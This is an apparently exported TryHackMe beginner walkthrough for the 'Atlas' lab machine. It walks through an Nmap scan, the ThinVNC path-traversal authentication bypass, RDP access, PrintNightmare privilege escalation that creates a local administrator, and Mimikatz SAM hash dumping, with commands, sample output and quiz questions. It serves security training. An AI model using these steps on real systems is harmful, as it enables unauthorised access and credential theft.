{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/4230419258baf63102a2e1fbe8e5e491.jpeg', 'title': 'Atlas', 'description': 'Hack the Atlas server in this beginner room covering Windows attack methodology!', 'code': 'atlas', 'users': 4567, 'tags': ['windows', 'guided', 'hybrid-challenge', 'beginner', 'VNC', 'ThinVNC', 'PrintNightmare', 'Atlas', 'MuirlandOracle'], 'type': 'walkthrough', 'difficulty': 'easy', 'userCompleted': False, 'upVotes': 410, 'created': '2021-08-30T22:03:20.251Z', 'published': '2021-09-29T19:00:00.375Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://assets.muirlandoracle.co.uk/thm/rooms/atlas/atlas-header.png', 'creator': 'MuirlandOracle', 'tasks': [{'taskTitle': '<span class="badge badge-soft-info size-16">Introduction</span> Room Overview and Deploy!', 'taskDesc': '<p>Welcome to Atlas!</p><p>This is an introductory level room which aims\n to teach you the very basics of Windows system exploitation, from \ninitial access, through to privilege escalation. You do not need any \nprior experience before attempting this room; however, it would help to \nhave an understanding of <a href="https://tryhackme.com/module/linux-fundamentals" target="_blank">basic Linux usage</a>\n and various other fundamental topics. Resources for these topics are \nlinked at appropriate places in the room for extra reading.</p><p>You \nwill find that a lot of this room is completely guided; however, there \nare places where the instructions are slightly more vague. These places \nare designed to help you develop the research mindset which is \nall-important in hacking.</p>', 'taskType': 'vm', 'taskNo': 1, 'taskCreated': '2021-08-30T22:03:41.722Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '612e9da257abbc0048874500', 'questions': [{'questionNo': 1, 'question': '<p>Press the Green "Start Machine" button to deploy the machine!</p><p><i><b>Note: </b>It may take up to three minutes for this machine to fully boot. <br /></i></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-warning size-16">Enumeration</span> Port Scanning', 'taskDesc': '<p>The key to hacking is information. </p><p>Contrary to what you may see in films and pop culture, hacking is not (usually) a matter of sitting in a darkened room and sending streams of green text cascading down a terminal window. Rather, it involves careful enumeration to find leverage-able mistakes in configurations or code and using them to force a system to do something that it is not supposed to do. For example, you may find that a web application fails to properly sanitise user input, resulting in you (as a white-hat hacker) being able to inject unwanted data into the database serving the site.</p><p>The <i>only</i> way to find these vulnerabilities is to patiently enumerate the attack surface. The more you know about your target(s), the better placed you will be to find and exploit vulnerabilities whilst evading any protective measures in place around the system. </p><hr /><p>This room will be very simple, but that doesn\'t mean we can get away without enumeration. </p><p>Once we know our target (in this case we have one target with an IPv4 address of <code>MACHINE_IP</code>), the first thing we nearly always do is perform a <i>port scan.</i> As a brief summary: every computer with network capabilities has 65535 available <i>ports</i>. Each of these can have a different service bound to it. For example, a single server may host web services on ports 80 and 443, an SMTP mail server on port 25, and a proxy on port 8080. The first 1024 ports are considered "well-known" and are assigned to services by convention. For example, a web server will nearly always use port 80 for HTTP and port 443 for HTTPS connections; this means that your web browser knows what port to look at automatically, which is why you don\'t have to specify the port when navigating to a website. </p><p><i><b>Note: </b>We won\'t cover the differences between the TCP and UDP protocols in this room. I</i><i>f you are interested, please read the information <a href="https://tryhackme.com/room/packetsframes" target="_blank">here</a>. If you are already familiar with these protocols, assume that all referenced ports are TCP ports in this room.</i></p><p>The fact that a single server can host multiple services means that we need ascertain what the target is exposing to us over the network before we can attempt to exploit anything: cue, port scans.</p><p>Port scanning effectively attempts to connect to specified ports on the target and checks the responses from the server to see if each targeted port is open, closed, or protected by a firewall. The most common tool for port scanning is a Command Line tool called <a href="https://nmap.org/" target="_blank">Nmap</a> -- it will be installed by default on any penetration testing distribution, including the AttackBox.</p><p>At its most basic, the syntax for Nmap is quite simply <code>nmap IP_ADDRESS</code><br />For example, scanning the always-running <code>10.10.10.10</code> box on the TryHackMe network gives us the following output:</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Nmap Basic Syntax\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">pentester@attacker:~$ nmap 10.10.10.10\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-08 14:53 BST\nNmap scan report for 10.10.10.10\nHost is up (0.032s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 0.58 seconds</code>\n        </pre>\n    </div>\n</div>\n<p>This is useful, but it doesn\'t quite give us everything we want. For example, we may wish to scan more than the default 1000 ports; we may want more information about the target, or to perform service detection. For these purposes we use <i>switches</i>. </p><p>Switches are command line arguments that alter the functionality of a tool. Nmap has hundreds of available switches (or flags, to give them another name). For example, we could use <code>-vv</code> to increase the verbosity of the output Nmap provides; in context, the full command would look like this: <code>nmap -vv IP_ADDRESS</code>.</p><p>Here is a useful (but far from comprehensive) list of switches:</p><table class="table table-bordered"><tbody><tr><td><b>Switch</b><br /></td><td><b>Does</b><br /></td></tr><tr><td><code>-vv</code></td><td>Set verbosity level to two<br /></td></tr><tr><td><code>-Pn</code></td><td><p>Don\'t bother assessing whether the machine is active -- just scan it.<i><br /><b>This is very useful for Windows machines</b> where ICMP echo (ping) packets are blocked by default on public networks.</i><br /></p></td></tr><tr><td><code>-p PORT,PORT</code><br /></td><td>Specify ports to scan, e.g. <code>-p 80,443</code></td></tr></tbody></table><p>This list will do for the time being, but please check out the <a href="https://tryhackme.com/room/furthernmap" target="_blank">Nmap room</a> for a more thorough explanation of the tool if you haven\'t already done so.<br /></p>', 'taskType': 'none', 'taskNo': 2, 'taskCreated': '2021-09-07T19:50:57.933Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Scan your target IP (<code>MACHINE_IP</code>) with Nmap!<br /></p><p><i><b>Note:</b> you will need the </i><code>-Pn</code><i> switch here. A complete command can be found in the hint.</i><br /></p>', 'hint': 'nmap -vv -Pn MACHINE_IP'}, {'questionNo': 2, 'question': '<p>With the Nmap default port range, you should find that two ports are open. What port numbers are these?</p><p>Submit the answer as a comma-separated list from low to high, e.g. <code>80,443</code>.</p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>What service does Nmap think is running on the higher of the two ports?</p>', 'hint': 'You do not need a service scan for this -- just take the answer from the Service field in a regular Nmap scan'}, {'questionNo': 4, 'question': '<p>We would usually go on to do a lot more in-depth scanning, but we will leave it at that for this introductory room. We have what we need for the time being.<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-warning size-16">Enumeration</span> Service Enumeration', 'taskDesc': '<p>In the previous task we discovered two services -- now it\'s time to see what we can do with them!</p><p>The first service we found was on port 3389. This is traditionally Microsoft\'s <b>R</b>emote <b>D</b>esktop <b>P</b>rotocol (RDP), which is used to get a graphic remote desktop session on the remote machine. We can verify whether this <i>is</i> RDP with an Nmap service scan:<br /></p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Service Scan Results\n        </div>\n        <pre class="terminal-code"><code class="lang-html"></code><pre style="color:#bac8d4;font-size:1em">pentester@attacker:~<span style="color:#e90">$</span> nmap -p 3389 -Pn -sV <span>MACHINE_IP</span>\nHost discovery disabled (-Pn). All addresses will be marked \'up\' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-08 19:04 BST\nNmap scan report for <span>MACHINE_IP</span>\nHost is up (0.027s latency).\n\nPORT     STATE SERVICE       VERSION\n3389/tcp open  ms-wbt-server <span style="color:red">Microsoft Terminal Services</span>\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.46 seconds</pre>   </pre></div></div>\n<p>Here the "Microsoft Terminal Services" tells us that this is indeed RDP. Knowing that this exists is beneficial as it potentially gives us a stable way to access the box later on; however, there are no recent vulnerabilities in the Microsoft implementation of RDP, so this isn\'t hugely useful to us at this moment in time.</p><hr /><p>Let\'s move on and have a look at the other service we found; this is more interesting. Port 8080 doesn\'t have an <i>official </i>designation, but it is often used for alternative HTTP services; for example, HTTP proxies frequently use it -- as Nmap (incorrectly) identified this service as. </p><p>Nmap is unable to get an accurate reading on the service here, which makes it all the more interesting. What happens when we try to access it in a web browser?</p><p><img alt="Screenshot showing the credential request from the server on port 8080" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d9e176315f8850e719252ed/room-content/d7f6be9e81b3e889eca38922caceac18.png" /></p><p>We get an request for authentication; this could have gone better, but it <i>does</i> tell us one very important thing: we are <i>definitely</i>\xa0 dealing with a web server of some kind.</p><p>Whilst newer versions of Firefox don\'t seem to show it, these HTTP Basic Authentication credential boxes usually come with a message from the server -- if we can get a look at that message then we might get a clue as to what is running on this port!</p><p><a href="https://curl.se/" target="_blank">cURL</a> is a command-line tool which lets us make (and craft) requests over various protocols -- most commonly HTTP(S).</p><p>Let\'s use it here to take a look at the headers the server is sending us when we connect to the port:<br /></p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            cURL request\n        </div>\n        <pre class="terminal-code"><code class="lang-html"></code><pre style="color:#bac8d4;font-size:1em">pentester@attacker:~<span style="color:#e90">$</span> curl <span>MACHINE_IP</span>:8080 -v\n*   Trying <span>MACHINE_IP</span>:8080...\n* Connected to <span>MACHINE_IP</span> (<span>MACHINE_IP</span>) port 8080 (#0)\n<span style="color:yellow">&gt; GET / HTTP/1.1\n&gt; Host: <span>MACHINE_IP</span>:8080\n&gt; User-Agent: curl/7.74.0\n&gt; Accept: */*\n&gt;</span> \n* Mark bundle as not supporting multiuse\n<span style="color:green">&lt; HTTP/1.1 401 Access Denied\n&lt; Content-Type: text/html\n&lt; Content-Length: 144\n&lt; Connection: Keep-Alive\n&lt; WWW-Authenticate: Digest realm="<span style="color:red">ThinVNC</span>", qop="auth", nonce="cgjgN/qz5UDo18cA+rPlQA==", opaque="oA7e3MQ0FZ304fZ2en85HLjvhsb5AEPRct"\n&lt; </span>\n<span style="color:#05f0fc">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;401 Access Denied&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;401 Access Denied&lt;/H1&gt;The requested URL  requires authorization.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;</span>\n* Connection #0 to host  left intact</pre>\n           \n        </pre>\n    </div>\n</div>\n<p>We have a variety of sections in this request -- all have been highlighted. </p><ul><li>In yellow we have the <i>request</i> headers -- these are what we <i>sent</i> to the server. We aren\'t interested in these just now.</li><li>In green we have the <i>response</i> headers -- these are what the server sent to <i>us</i> in response. This contains something interesting.</li><li>In cyan we have the response <i>body</i> telling us that we aren\'t allowed to access the site unless we supply some credentials.</li></ul><p>In red we have what we were looking for. "ThinVNC" is the name of a web-based <b>V</b>irtual <b>N</b>etwork <b>C</b>omputing (VNC) server. Like RDP, VNC allows us to access a device remotely; however, this server allows us to access to device from our web browser rather than requiring a separate client to connect. As a side note, if you are using the AttackBox in your browser right now then you are also connected to it using VNC. </p><p>A little research informs us that the latest release of ThinVNC is very old -- this vastly increases the chances of it being vulnerable to <i>something.</i> Let\'s open a terminal and use a tool called <code>searchsploit</code> to look for vulnerabilities for the software (querying the <a href="https://exploit-db.com/" target="_blank">Exploit-DB</a> database):</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Searchsploit Results\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">pentester@attacker:~$ searchsploit thinvnc\n---------------------------------------------- ---------------------------------\n Exploit Title                                |  Path\n---------------------------------------------- ---------------------------------\nThinVNC 1.0b1 - Authentication Bypass         | windows/remote/47519.py\n---------------------------------------------- ---------------------------------\nShellcodes: No Results</code>\n        </pre>\n    </div>\n</div>\n<p>Bingo!<br /></p>', 'taskType': 'none', 'taskNo': 3, 'taskCreated': '2021-09-07T19:51:17.729Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Use searchsploit to find the vulnerability in ThinVNC<br />', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(163,164,247,.18);color:#a3a4f7">Attack</span> Foothold', 'taskDesc': '<p>At this point we would usually copy the exploit, read through it carefully (very important!) then deploy it against the target when we are satisfied that it only does what it claims to do.</p><p>In this case the exploit in Exploit-DB doesn\'t actually work, but it does give us an idea of what we\'re dealing with. The short version is:</p><p></p><div style="padding:10px 0 10px 20px;border-left:1px solid #888888">The latest version of ThinVNC (at the time of writing) contains a path traversal vulnerability which effectively allows us to read any file on the target. Combine this with the fact that ThinVNC (stupidly) stores its access credentials in plaintext (i.e. completely unsecured), we can read the file containing the credentials and bypass the authentication!</div><p></p><p>For the sake of keeping things very simple, we are going to use a working copy of the exploit to access the credentials.<br /></p>', 'taskType': 'none', 'taskNo': 4, 'taskCreated': '2021-09-07T19:51:31.722Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p><i>Clone</i> the Git repository at <a href="https://github.com/MuirlandOracle/CVE-2019-17662" target="_blank">https://github.com/MuirlandOracle/CVE-2019-17662</a>\xa0 to your attacking machine.</p><p>See if you can figure out how to do this in your terminal by yourself, otherwise, the command is given in the hint.<br /></p>', 'hint': 'git clone https://github.com/MuirlandOracle/CVE-2019-17662'}, {'questionNo': 2, 'question': '<p>Switch into the newly created exploit directory and set the file to be executable (<code>chmod +x CVE-2019-17662.py</code>) -- this may already be done for you, but better safe than sorry!</p><p>Try executing the exploit -- you should see a help menu</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Making the Exploit Executable\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">pentester@attacker:~$ cd CVE-2019-17662/\npentester@attacker:~/CVE-2019-17662$ chmod +x CVE-2019-17662.py \npentester@attacker:~/CVE-2019-17662$ ./CVE-2019-17662.py \nusage: CVE-2019-17662.py [-h] [-f FILE] [-s] [--accessible] host port\nCVE-2019-17662.py: error: the following arguments are required: host, port</code></pre>\n    </div>\n</div>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Read through the exploit help menu</p><p>This script <i>requires</i> two arguments. Ascertain what these arguments are, then use the script to exploit the vulnerable service on the target.</p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>Use the credentials found by the script to get past the HTTP Basic Auth presented when trying to access the vulnerable service in your web browser. You should have access to a user desktop!<br /></p>', 'hint': ''}, {'questionNo': 5, 'question': '<p><b>[Bonus Question -- Optional] </b>Read through the exploit code and try to perform the exploit manually using cURL or Burp Suite. You may need to look into <i>path normalisation</i> for error debugging.<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(186,237,252,.18);color:#baedfc">Access</span> VNC 🠖 RDP', 'taskDesc': "<p>If you've reached this task then you should have user access to the machine -- congratulations!</p><p>The access that we have just now is mildly revolting though. ThinVNC does not provide the nicest interface to use, and we struggle to use a lot of the functionality of the machine through it. </p><p>Cast your mind back to our initial enumeration. Remember we found that Microsoft Remote Desktop Services were running on port 3389? Assuming we have the proper credentials, we can connect to this from Linux using a tool called <code>xfreerdp</code>.</p><p>The syntax for using <code>xfreerdp</code> looks like this:<br /><code>xfreerdp /v:MACHINE_IP /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp</code><br /></p><p>There's a bunch of stuff going on here, so let's break each switch down:</p><ul><li><code>/v:MACHINE_IP</code> -- this is where we specify what we want to connect to.</li><li><code>/u:USERNAME /p:PASSWORD</code> -- here we would substitute in a valid username/password combination.</li><li> <code>/cert:ignore</code> -- RDP connections are encrypted. If our attacking machine doesn't recognise the certificate presented by the machine we are connecting to it will warn us and ask if we wish to proceed; this switch simply ignores that warning automatically.</li><li><code>+clipboard</code> -- this shares our clipboard with the target, allowing us to copy and paste between our attacking machine and the target machine.</li><li><code>/dynamic-resolution</code> lets us resize the GUI window, adjusting the resolution of our remote session automatically.</li><li><code>/drive:share,/tmp</code> -- our final switch, this shares our own <code>/tmp</code> directory with the target. This is an <i>extremely</i> useful trick as it allows us to execute scripts and programs from our own machine without actually transferring them to the target (we will see this in action later!)</li></ul>", 'taskType': 'none', 'taskNo': 5, 'taskCreated': '2021-09-07T20:37:42.316Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Most people take the easy option when it comes to passwords, which makes password reuse incredibly common.</p><p>With that in mind, use <code>xfreerdp</code> to connect to the target over RDP. <br /></p>', 'hint': 'Use the same credentials you found in the previous task for VNC.'}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(163,164,247,.18);color:#a3a4f7">Attack</span> Privilege Escalation', 'taskDesc': '<p>Windows exploitation is a massive topic which is complicated greatly by the common-place nature of various defence mechanisms -- Anti-Virus software being the most well-known of these. Exploiting an up-to-date Windows target with the default defences active is <i>far</i> outwith the scope of this room, so we will assume that the Atlas server has had the defence mechanisms de-activated.</p><p>At this point we would usually start to enumerate the target to look for privilege escalation opportunities (or potentially lateral movement opportunities in an Active Directory environment). <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank">WinPEAS</a> and <a href="https://github.com/GhostPack/Seatbelt" target="_blank">Seatbelt</a> are prime examples of tools that we may wish to employ here; however, there are many other tools available, and manual enumeration is always a wise idea.</p><p>That said, Windows enumeration can be daunting; there are hundreds of different vectors to consider. To keep this room simple, we will instead look at a set of exploits in the PrintSpooler service which are unpatched at the time of writing. PrintSpooler is notorious for privilege escalation vulnerabilities. It runs with the maximum available permissions (under the <code>NT AUTHORITY\\SYSTEM</code> account) and is a popular target for vulnerability research. There have been many vulnerabilities found in this service in the past; however, one of the latest is referred to as "PrintNightmare". <br /></p><p>We will use PrintNightmare to elevate our privileges on this target.<br /></p>', 'taskType': 'none', 'taskNo': 6, 'taskCreated': '2021-09-07T19:52:30.464Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'There are many different implementations of PrintNightmare available. You are advised to use a <a href="https://github.com/calebstewart/CVE-2021-1675" target="_blank">PowerShell version</a> written by <a href="https://twitter.com/calebjstewart" target="_blank">Caleb Stewart</a> and <a href="https://twitter.com/_JohnHammond" target="_blank">John Hammond</a>.<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>Navigate to the <code>/tmp</code> directory of your attacking VM, then clone the <a href="https://github.com/calebstewart/CVE-2021-1675" target="_blank">repository</a>.</p><p>Remember that <code>/drive:/tmp,share</code> argument in the <code>xfreerdp</code> command? It\'s about to come in useful.<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Inside your RDP session, open a new PowerShell Window.<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>The repository that we downloaded contains a PowerShell (<code>.ps1</code>) script that needs to be imported.</p><p>We can import it using:<br /><code>. \\\\tsclient\\share\\CVE-2021-1675\\CVE-2021-1675.ps1</code></p><p><i>Make sure to include the dot at the start!</i></p><p>This uses dot-syntax to import any functions exposed by the script. We are using <code>\\\\tsclient\\share</code> to reference the share that we created. This allows us to view (and thus import) files that are stored in the /tmp folder of our own attacking machine!<br /></p>', 'hint': ''}, {'questionNo': 5, 'question': '<p>Only one thing left to do: run the exploit!</p><p>We can start the ball rolling by executing <code>Invoke-Nightmare</code>.</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Exploiting PrintNightmare\n        </div>\n        <pre class="terminal-code">           <code class="language-powershell">PS C:\\Users\\Atlas&gt; Invoke-Nightmare\n[+] using default new user: adm1n\n[+] using default new password: P@ssw0rd\n[+] created payload at C:\\Users\\Atlas\\AppData\\Local\\Temp\\1\\nightmare.dll\n[+] using pDriverPath = "C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_18b0d38ddfaee729\\Amd64\\mxdwdrv.dll"\n[+] added user  as local administrator\n[+] deleting payload from C:\\Users\\Atlas\\AppData\\Local\\Temp\\1\\nightmare.dll</code>\n        </pre>\n    </div>\n</div>', 'hint': ''}, {'questionNo': 6, 'question': '<p>Notice that our payload mentions creating a new user called <code>adm1n</code> with a password of <code>P@ssw0rd</code>? This is the default behaviour when using this exploit; however, we could have created our own payload and substituted that in should we have preferred another method of exploitation.</p><p>Regardless, we can now make use of our brand new admin account!<br /></p>', 'hint': ''}, {'questionNo': 7, 'question': '<p>We could take the simple option of right-clicking on PowerShell or cmd.exe and choosing to "Run as Administrator", but that\'s no fun. Instead, let\'s use a hacky little PowerShell command to start a new high-integrity command prompt running as our new administrator.</p><p>The command is as follows:<br /><code class="language-powershell">Start-Process powershell \'Start-Process cmd -Verb RunAs\' -Credential adm1n</code></p><p>Execute this in your PowerShell session and follow the steps to spawn a new PowerShell process as an Administrator!<br /></p>', 'hint': ''}, {'questionNo': 8, 'question': '<p>Run the command <code>whoami /groups</code> in the new window. You should see <code>BUILTIN\\Administrators</code> in the list of groups, and a line at the bottom of the output containing <code>Mandatory Label\\High Mandatory Level</code>.</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            whoami /groups\n        </div>\n        <pre class="terminal-code">           <code class="language-powershell"></code><pre style="color:#bac8d4;font-size:1em">PS C:\\Windows\\system32&gt; whoami /groups\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                                    Type             SID         \n============================================================= ================ ============\nEveryone                                                      Well-known group S-1-1-0     \nNT AUTHORITY\\Local account and member of Administrators group Well-known group S-1-5-114   \n<span style="color:red">BUILTIN\\Administrators</span>                                        Alias            S-1-5-32-544\nBUILTIN\\Users                                                 Alias            S-1-5-32-545\nNT AUTHORITY\\INTERACTIVE                                      Well-known group S-1-5-4\nNT AUTHORITY\\Authenticated Users                              Well-known group S-1-5-11\nNT AUTHORITY\\This Organization                                Well-known group S-1-5-15\nNT AUTHORITY\\Local account                                    Well-known group S-1-5-113\nLOCAL                                                         Well-known group S-1-2-0\nNT AUTHORITY\\NTLM Authentication                              Well-known group S-1-5-64-10\n<span style="color:red">Mandatory Label\\High Mandatory Level</span>                          Label            S-1-16-12288\n\n</pre>\n        </pre>\n    </div>\n</div>\n\n<p>These mean that you are running as an administrator with full access over the machine. Congratulations!<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(163,164,247,.18);color:#a3a4f7">Attack</span> Post Exploitation', 'taskDesc': '<p>Awesome -- we have admin access! Now what do we do with it?</p><p>The classic thing to do here would be to try to dump the password hashes from the machine. In a network scenario these could come in handy for lateral movement. They also give us a way to prove our access to a client as Windows (<a href="https://www.rapid7.com/blog/post/2021/07/21/microsoft-sam-file-readability-cve-2021-36934-what-you-need-to-know/" target="_blank">Serious Sam</a> vulnerability aside) prevents anyone from accessing this information if they don\'t have the highest possible privileges.</p><p>The most commonly used tool to dump password hashes on Windows is <a href="https://github.com/gentilkiwi/mimikatz" target="_blank">Mimikatz</a> by the legendary <a href="https://twitter.com/gentilkiwi/" target="_blank">Benjamin Delpy</a>. The go-to tool for Windows post-exploitation: few tools are more iconic or more well-known than Mimikatz. </p>', 'taskType': 'none', 'taskNo': 7, 'taskCreated': '2021-09-09T01:49:57.886Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>First up, let\'s get an up-to-date copy of Mimikatz to our attacking machine. The code for the tool is publicly available on Github, but fortunately for the sake of simplicity, there are also pre-compiled versions available for download.</p><p>Go to the <a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank">releases page</a> for Mimikatz and find the latest release at the top of the list. Download the file called <code>mimikatz_trunk.zip</code> to your attacking machine.</p><p><i><b>Note: </b>Certain browsers block the repository as being malicious. You\'re a hacker -- of course it\'s malicious. Just continue to the page anyway: it\'s perfectly safe.</i><br /></p>', 'hint': ''}, {'questionNo': 2, 'question': '<p>Make sure that the zip file is in your <code>/tmp</code> directory, then unzip it with <code>unzip mimikatz_trunk.zip</code>:</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Unzipping Mimikatz\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">pentester@attacker:/tmp$ unzip mimikatz_trunk.zip \nArchive:  mimikatz_trunk.zip\n  inflating: kiwi_passwords.yar      \n  inflating: mimicom.idl             \n  inflating: README.md               \n   creating: Win32/\n  inflating: Win32/mimidrv.sys       \n  inflating: Win32/mimikatz.exe      \n  inflating: Win32/mimilib.dll       \n  inflating: Win32/mimilove.exe      \n  inflating: Win32/mimispool.dll     \n   creating: x64/\n  inflating: x64/mimidrv.sys         \n  inflating: x64/mimikatz.exe        \n  inflating: x64/mimilib.dll         \n  inflating: x64/mimispool.dll</code></pre>\n    </div>\n</div>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Now we can get to work!</p><p>Switch back into your RDP session and (using the elevated Command Shell we obtained in the last task) execute the following command to start Mimikatz:<br /><code>\\\\tsclient\\share\\x64\\mimikatz.exe</code></p><p>If this is successful then you should get some pretty ASCII art and a new terminal prompt:</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Mimikatz Prompt\n        </div>\n        <pre class="terminal-code">           <code class="language-powershell"></code><pre style="color:#bac8d4;font-size:1em">PS C:\\Windows\\system32&gt; \\\\tsclient\\share\\x64\\mimikatz.exe\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53\n .## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz\n \'## v ##\'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  \'#####\'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz #\n\n</pre>\n        </pre>\n    </div>\n</div>', 'hint': ''}, {'questionNo': 4, 'question': '<p>When we start Mimikatz we usually have to execute two commands before we start dumping hashes:</p><ul><li>\xa0<code>privilege::debug</code> -- this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for "debugging" purposes.</li><li><code>token::elevate</code> -- simply put, this takes us from our administrative shell with high privileges into a <code>SYSTEM</code> level shell with maximum privileges. This is something that we have a <i>right </i>to do as an administrator, but that is not usually possible using normal Windows operations.<br /></li></ul><p>With these commands executed, we are ready to dump some passwords hashes!<br /></p>', 'hint': ''}, {'questionNo': 5, 'question': '<p>There are a variety of commands we <i>could</i> use here, all of which do slightly different things. The command that we <i>will</i> use is: <code>lsadump::sam</code>.</p><p>When executed, this will provide us with a list of password hashes for every account on the machine (with some extra information thrown in as well). The Administrator account password hash should be fairly near the top of the list:</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Using Mimikatz\n        </div>\n        <pre class="terminal-code"><code class="lang-html"></code><pre style="color:#bac8d4;font-size:1em">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53\n .## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz\n \'## v ##\'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  \'#####\'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # privilege::debug\nPrivilege \'20\' OK\n\nmimikatz # token::elevate\nToken Id  : 0\nUser name :\nSID name  : NT AUTHORITY\\SYSTEM\n\n---\n\nmimikatz # lsadump::sam\nDomain : GAIA\nSysKey : 36c8d26ec0df8b23ce63bcefa6e2d821\nLocal SID : S-1-5-21-1966530601-3185510712-10604624\n\nSAMKey : 6e708461100b4988991ce3b4d8b1784e\n\nRID  : 000001f4 (500)\nUser : Administrator\n  Hash NTLM: <span style="color:red">[REDACTED]</span>\n\n</pre>\n           \n        </pre>\n    </div>\n</div>', 'hint': ''}, {'questionNo': 6, 'question': "<p>What is the Administrator account's NTLM password hash?<br /></p>", 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-info size-16">Conclusion</span> Final Thoughts', 'taskDesc': '<p>Congratulations -- you hacked Atlas!</p><p>This was a beginner box which has hopefully provided you with some skills which will prove useful as you progress in your hacking journey. We covered initial exploitation of outdated software, as well as exploiting the Windows PrintSpooler and dumping password hashes with Mimikatz.</p><p>Kudos for completing the room: now go hack some more!<br /></p>', 'taskType': 'none', 'taskNo': 8, 'taskCreated': '2021-09-07T19:52:42.597Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'I hacked Atlas!<br />', 'hint': ''}]}]}